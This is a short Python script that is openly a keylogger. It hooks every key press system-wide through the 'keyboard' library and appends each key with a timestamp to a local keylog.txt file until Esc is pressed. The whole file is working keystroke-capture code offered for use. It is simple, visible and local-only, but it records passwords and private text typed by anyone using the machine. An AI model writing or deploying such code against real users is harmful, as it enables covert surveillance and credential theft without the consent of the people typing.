import keyboard
import time
from datetime import datetime


log_file = "keylog.txt"

def on_press(event):
    with open(log_file, "a") as f:
        f.write(f"{datetime.now()} - Key pressed: {event.name}\n")

def start_keylogger():
    print("Keylogger started. Press 'Esc' to stop.")
    keyboard.on_press(on_press)
    keyboard.wait('esc')
    print("Keylogger stopped.")

if __name__ == "__main__":
    start_keylogger()